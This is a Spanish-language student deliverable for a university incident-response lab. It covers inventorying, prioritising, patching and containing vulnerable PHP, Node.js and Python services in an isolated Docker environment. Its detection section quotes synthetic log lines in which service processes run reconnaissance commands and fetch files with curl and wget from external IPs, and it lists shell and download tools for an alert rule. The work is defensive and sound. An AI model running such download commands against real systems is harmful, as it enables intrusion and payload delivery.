# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 07
**Fork del grupo:** [TomasTerruli/goys-2026-tp-vulnerabilidades](https://github.com/TomasTerruli/goys-2026-tp-vulnerabilidades)
**Rama:** `grupo-07`

**Fecha de entrega original:** 29/10/2026
**Última actualización:** 08/11/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Tomás Terruli | `TomasTerruli` | Inventario, mitigación, parche y pruebas funcionales |
| Martina Castellani | `Marticaste144` | Contención de contenedores y evidencias de seguridad |
| Pilar Giannelli | `pilargiannelli` | Detección, análisis de logs e integración del entregable |

> Los roles se asignaron según los aportes realizados por cada integrante.
> Todos deben poder explicar su parte y una parte ajena.

---

## 1. Inventario

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP | PHP 8.3.35, Apache con mod_php, `session.upload_progress.enabled=1` | No | Sí | Sí | `capturas/01-arranque-inventario.txt` y `capturas/02-apache-modulos.txt` |
| API Node.js | Node.js 22.23.3, Brotli integrado 1.1.0 | No | Sí | Sí | `capturas/01-arranque-inventario.txt` |
| Servicio Python | Python 3.11.18, Brotli 1.0.9 | No | Sí | Sí | `capturas/01-arranque-inventario.txt` |

**Supuestos de exposición:**

En el laboratorio, ninguno de los tres servicios está expuesto directamente a Internet, ya que `docker-compose.yml` utiliza una red interna (`internal: true`) y no publica puertos hacia el exterior.

El portal PHP procesa solicitudes HTTP y permite la recepción de archivos. La API Node.js recibe contenido mediante el endpoint `/decode`, que utiliza el decodificador Brotli. El servicio Python también puede recibir y descomprimir contenido Brotli mediante solicitudes HTTP.

Los tres servicios utilizan versiones afectadas por las vulnerabilidades analizadas. Sin embargo, estar afectados no implica que hayan sido comprometidos.

Para analizar un posible entorno de producción, suponemos que el portal PHP y la API Node.js podrían estar publicados detrás de un proxy inverso, mientras que el servicio Python permanecería accesible únicamente desde la red interna. Estos son supuestos de arquitectura, no condiciones comprobadas en el laboratorio.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 | Sí. CVE-2026-109618 y CVE-2026-109619 incluidos en CISA KEV desde el 26/10/2026. | No expuesto en el laboratorio. Se supone acceso público mediante proxy en producción. | Alta: portal con sesiones y recepción de archivos, que podría permitir ejecución remota de código sin autenticación. | Prioridad 1: aplicar mitigación inmediata y parchear PHP 8.3.35 a 8.3.36 en una ventana de emergencia dentro de las primeras 2 horas. |
| API Node.js | 9.2 | Sí. CVE-2026-111497 incluido en CISA KEV desde el 27/10/2026. | No expuesta en el laboratorio. Se supone acceso público mediante proxy en producción. | Alta: API que procesa contenido Brotli y podría sufrir ejecución remota de código o denegación de servicio. | Prioridad 2: reducir temporalmente la exposición a Brotli y actualizar Node.js 22.23.3 a 22.23.4 dentro de las primeras 4 horas. |
| Servicio Python | 9.2 | Sí, para la vulnerabilidad de Brotli CVE-2026-111497, aunque no hay evidencia específica de explotación de este servicio. | No expuesto en el laboratorio. Se supone que permanece en una red interna en producción. | Media: servicio interno que utiliza Brotli 1.0.9 para procesar contenido recibido mediante HTTP. | Prioridad 3: restringir el acceso al servicio y actualizar Brotli 1.0.9 a 1.2.1 dentro de las primeras 24 horas. |

**Justificación:**

El orden de prioridad se definió considerando la gravedad de las vulnerabilidades, la explotación real conocida, la exposición potencial a Internet y la criticidad de cada servicio.

El portal PHP se considera la primera prioridad porque utiliza una versión vulnerable del núcleo de PHP y Apache con mod_php, configuración identificada como especialmente riesgosa. Además, las vulnerabilidades CVE-2026-109618 y CVE-2026-109619 tienen explotación activa confirmada.

La API Node.js ocupa la segunda prioridad porque su runtime contiene un decodificador Brotli vulnerable y procesa contenido HTTP. La vulnerabilidad CVE-2026-111497 también figura en CISA KEV, por lo que requiere una actualización urgente.

El servicio Python se ubica en tercer lugar porque, aunque utiliza una versión afectada de Brotli, en el escenario de producción supuesto permanece en una red interna y tiene menor exposición que los otros servicios.

Los plazos indicados son objetivos propuestos por el equipo para un escenario de producción. No representan tiempos efectivamente medidos durante el laboratorio.

**Evidencia que podría modificar el orden:**

La priorización se revisaría si se comprobara que el servicio Python es accesible desde Internet, procesa información crítica o presenta indicadores de compromiso. En ese caso podría aumentar su prioridad.

También cambiaría si aparecieran indicadores de explotación activa en la API Node.js, si alguno de los servicios procesara datos especialmente sensibles o si un control de mitigación resultara ineficaz.

**Fuentes utilizadas:**

- `recursos/contexto.md`: vulnerabilidades, CVSS, versiones corregidas y antecedentes de explotación.
- `capturas/01-arranque-inventario.txt`: versiones reales del laboratorio.
- `capturas/02-apache-modulos.txt`: confirmación del módulo PHP en Apache.
- `laboratorio/docker-compose.yml`: configuración de la red y exposición de los servicios.

---

## 3. Mitigación, parche y reversión

| Fecha/hora | Activo | Cambio | Antes | Después | Reversión |
|---|---|---|---|---|---|
| 06/11/2026 | Portal PHP | Mitigación temporal: se modificó `laboratorio/php/php.ini`, deshabilitando `session.upload_progress.enabled`, y se reinició `php-lab`. | `session.upload_progress.enabled=1`. Evidencia: `capturas/03-php-antes-mitigacion.txt`. | `session.upload_progress.enabled=0`. Los tres servicios permanecieron `healthy`. Evidencias: `capturas/04-php-despues-mitigacion.txt` y `capturas/05-php-post-mitigacion-ps.txt`. | Restaurar `session.upload_progress.enabled = 1` en `php/php.ini`, reiniciar `php-lab` y verificar. Reintroduciría el riesgo, por lo que solo se consideraría con justificación y controles compensatorios. |
| 06/11/2026 | Portal PHP | Actualización mediante `./scripts/parchear.sh`. | PHP 8.3.35 con Apache y mod_php. | PHP 8.3.36; mitigación `session.upload_progress.enabled=0` mantenida; contenedor `healthy` y respuesta HTTP correcta. | Propuesta no ejecutada: volver a la imagen `php:8.3.35-apache`, recrear `php-lab` y verificar. Reintroduciría la versión vulnerable. |
| 06/11/2026 | API Node.js | Actualización del runtime mediante `./scripts/parchear.sh`. | Node.js 22.23.3 con Brotli integrado 1.1.0. | Node.js 22.23.4; Express 5.3.0; contenedor `healthy` y API funcionando. | Propuesta no ejecutada: volver a la imagen Node.js `22.23.3-bookworm-slim`, recrear `node-lab` y verificar. Reintroduciría la versión vulnerable. |
| 06/11/2026 | Servicio Python | Actualización de Brotli mediante `./scripts/parchear.sh`. | Brotli 1.0.9. | Brotli 1.2.1; contenedor `healthy` y respuesta HTTP 200. | Propuesta no ejecutada: volver a la imagen del laboratorio con Brotli `1.0.9`, recrear `py-lab` y verificar. Reintroduciría la versión vulnerable. |

**Evidencias del proceso:**

- `capturas/01-arranque-inventario.txt`: arranque inicial, versiones vulnerables y estado de los contenedores.
- `capturas/02-apache-modulos.txt`: módulos de Apache; confirma la presencia de `php_module`.
- `capturas/03-php-antes-mitigacion.txt`: configuración inicial de PHP, con `session.upload_progress.enabled=1`.
- `capturas/04-php-despues-mitigacion.txt`: verificación de la mitigación, con `session.upload_progress.enabled=0`.
- `capturas/05-php-post-mitigacion-ps.txt`: servicios en estado `healthy` después de mitigar PHP.
- `capturas/06-parche.txt`: ejecución del script de parcheo y versiones corregidas de PHP, Node.js y Brotli.
- `capturas/07-post-parche-ps.txt`: estado `healthy` de los tres servicios después del parche.
- `capturas/08-prueba-node.txt`: respuesta funcional de la API Node.js.
- `capturas/09-prueba-php.txt`: respuesta HTTP del portal PHP.
- `capturas/10-prueba-python.txt`: respuesta HTTP 200 del servicio Python.

**Prueba funcional mínima:**

Después de aplicar los parches, se verificó el funcionamiento básico de los tres servicios:

1. **Portal PHP:** respondió correctamente a una solicitud HTTP local y devolvió 1093 bytes. Se comprobó además que la mitigación `session.upload_progress.enabled=0` permaneció activa.
2. **API Node.js:** respondió correctamente desde su endpoint principal e informó Node.js `v22.23.4`, Express `5.3.0` y Brotli integrado `1.1.0`. Este último valor no implica ausencia del parche, ya que la corrección está incorporada en la versión actualizada del runtime Node.js.
3. **Servicio Python:** respondió con HTTP 200 e informó Python `3.11.18` y Brotli `1.2.1`.

Los tres contenedores quedaron en estado `healthy` después del parche.

**Qué no se pudo probar:**

No se ejecutaron exploits ni pruebas de explotación, respetando las restricciones del laboratorio establecidas por la cátedra. Por lo tanto, no se verificó mediante un ataque que las vulnerabilidades ya no pudieran explotarse.

Tampoco se realizaron pruebas de carga, regresión completa, funcionamiento con usuarios reales ni verificaciones sobre un entorno de producción. Las pruebas funcionales realizadas demuestran el funcionamiento básico de los servicios, pero no garantizan la ausencia de otros errores.

Los procedimientos de reversión fueron documentados, pero no ejecutados. Una reversión a las versiones anteriores reintroduciría vulnerabilidades conocidas y requeriría autorización y controles compensatorios.

**Ventana de cambio y alcance:**

Los cambios se realizaron el 06/11/2026 sobre el laboratorio Docker aislado proporcionado por la cátedra. No se modificaron sistemas de producción ni se ejecutaron exploits.

Primero se aplicó la mitigación temporal de PHP. Posteriormente, se actualizaron las versiones de PHP, Node.js y Brotli mediante el script provisto por el profesor, se recrearon los servicios y se realizaron las verificaciones correspondientes.

El parche de PHP quedó en la versión `8.3.36`, Node.js en `22.23.4` y Brotli de Python en `1.2.1`.

Los plazos propuestos en la sección 2 representan objetivos de intervención ante un incidente en producción y no tiempos medidos durante este laboratorio.

La reversión se mantuvo únicamente como procedimiento documentado para una eventual falla grave posterior al cambio.

---

## 4. Detección y caza

El detalle completo está en [`deteccion.md`](deteccion.md) y la salida de los filtros en `capturas/16-deteccion-procesos.txt`.

**Hipótesis:** si algún servicio fue explotado, el proceso del servicio (`apache2`, `node` o `python`) debería aparecer lanzando una shell o una herramienta de descarga entre las 09:40 y las 09:49 UTC del 27/10, primero con comandos de reconocimiento y después con alguna descarga desde una IP externa.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| L6-L7 · 09:42:17 | web01 | apache2 → `sh -c id` → `id` | Sí | El servidor web ejecuta un comando de reconocimiento. |
| L9-L10 · 09:43:03 | api01 | node → `sh` → `curl http://198.51.100.7/x` | Sí | La API lanza una descarga desde una IP externa. |
| L14 · 09:44:22 | web01 | apache2 → `wget http://198.51.100.9/a` | Sí | Otra descarga desde el servidor web, desde el mismo rango de IPs. |
| L16-L17 · 09:45:10 | svc01 | python → `sh` → `uname -a` | Sí | Reconocimiento del sistema en el servicio interno. |
| L8, L13, L21 | db01 | sshd → `bash` | Indeterminado | Pueden ser sesiones de un administrador; el log no trae usuario ni IP. |

**¿Hay compromiso?** Sí en web01 y api01, porque el proceso del servicio ejecutó comandos y lanzó descargas. En svc01 también hay ejecución de comandos, pero no sabemos cómo llegaron porque es un servicio interno. db01 queda indeterminado. El log no permite saber si las descargas funcionaron ni si hubo escalada a root.

**Regla propuesta para Node.js:** alertar cuando un proceso `node` lanza `sh`, `bash`, `curl`, `wget`, `nc` u otro intérprete, y seguir también a los procesos que lance ese hijo, porque el filtro de `detectar.sh` no muestra las líneas 7, 10 y 17. El principal falso negativo es un atacante que descarga algo con `fetch()` dentro del mismo proceso `node`, sin crear ningún proceso hijo.

**Limitaciones del log:** no tiene usuario, IP de origen ni el request HTTP, no muestra si los comandos funcionaron, no registra red ni archivos, cubre solo 9 minutos y es un registro sintético de laboratorio.

---

## 5. Contención

| Control | Configuración | Evidencia | ¿Funciona? |
|---|---|---|---|
| Red sin salida | Red Docker con `internal: true`, sin puertos publicados al host. | `capturas/11-red-interna.txt` y `capturas/13-verificacion-contencion.txt` | Sí. Los tres servicios fallaron al intentar conectarse a Internet. |
| Usuario sin privilegios | Node.js utiliza `node` (UID 1000); Python utiliza `nobody` (UID 65534). Apache tiene un proceso principal `root` y trabajadores `www-data`. | `capturas/14-usuarios-contenedores.txt` y `capturas/15-procesos-php.txt` | Parcial. Node.js y Python ejecutan sus procesos con usuarios sin privilegios; Apache conserva un proceso principal como `root`. |
| Filesystem read-only | `read_only: true` en los tres contenedores. | `capturas/12-controles-contenedores.txt` | Configuración confirmada mediante Docker Inspect; no se realizó una prueba directa de escritura. |
| Capabilities mínimas | `cap_drop: ALL` y `no-new-privileges:true` en los tres contenedores. | `capturas/12-controles-contenedores.txt` | Configuración confirmada mediante Docker Inspect; no se realizaron pruebas de escalada de privilegios. |
| Límites de memoria/PIDs | PHP y Node.js: 256 MB y 100 procesos. Python: 128 MB y 50 procesos. | `capturas/12-controles-contenedores.txt` | Límites configurados y verificados; no se realizaron pruebas de agotamiento de recursos. |
| Rechazo de Brotli innecesario | Medida compensatoria propuesta: rechazar solicitudes con contenido Brotli cuando la funcionalidad no sea necesaria. | Recomendación defensiva; sin evidencia de aplicación en el laboratorio. | No probado. |

**Prueba de salida a Internet:**

Se ejecutó `scripts/verificar-contencion.sh` sobre los tres servicios. Los resultados fueron:

- **PHP:** `SIN SALIDA`.
- **Node.js:** `SIN SALIDA TypeError`.
- **Python:** `SIN SALIDA URLError`.

Los tres intentos fallaron, como se esperaba para un laboratorio con una red Docker interna. La evidencia se encuentra en `capturas/13-verificacion-contencion.txt`.

**Riesgos residuales y recomendaciones:**

La contención reduce la exposición y limita algunas consecuencias de una posible explotación, pero no elimina las vulnerabilidades del software.

Se recomienda mantener las versiones corregidas, evaluar la posibilidad de ejecutar Apache completamente sin privilegios de `root` y verificar periódicamente las restricciones configuradas.

Además, en un entorno de producción sería conveniente realizar pruebas controladas de escritura, privilegios y consumo de recursos para comprobar la eficacia de los controles que aquí solamente se inspeccionaron.

## 6. Conclusión (5 líneas)

En las primeras dos horas priorizaríamos identificar los servicios expuestos, confirmar las versiones vulnerables y preservar los registros para investigar posibles compromisos.

Aplicaríamos inmediatamente las mitigaciones disponibles, comenzando por PHP debido a su criticidad y antecedentes de explotación, y prepararíamos los parches correspondientes.

Mantendríamos el aislamiento de red, los permisos restringidos, el sistema de archivos de solo lectura y los límites de recursos para reducir el impacto de una posible explotación.

Coordinaríamos la respuesta con los responsables técnicos y comunicaríamos a gerencia los riesgos, las medidas aplicadas y las limitaciones de la evidencia disponible.

Finalmente, verificaríamos el funcionamiento de los servicios después de los cambios y estableceríamos un seguimiento de los indicadores de compromiso y de los controles de contención.

## 7. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI y configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Al menos 3 controles de contención configurados y verificados: aislamiento de red, filesystem de solo lectura y restricción de privilegios.
- [x] `deteccion.md` completo.
- [x] Informes individuales completos: `informe-tomas.md`, `informe-marti.md` e `informe-pili.md`.
- [x] Sin claves, tokens ni placeholders en los entregables.
- [x] Rama `grupo-07` pusheada al fork del grupo.
- [ ] Pull Request abierto hacia el repositorio original.

Checklist completa: [`docs/checklist-entrega.md`](../../docs/checklist-entrega.md).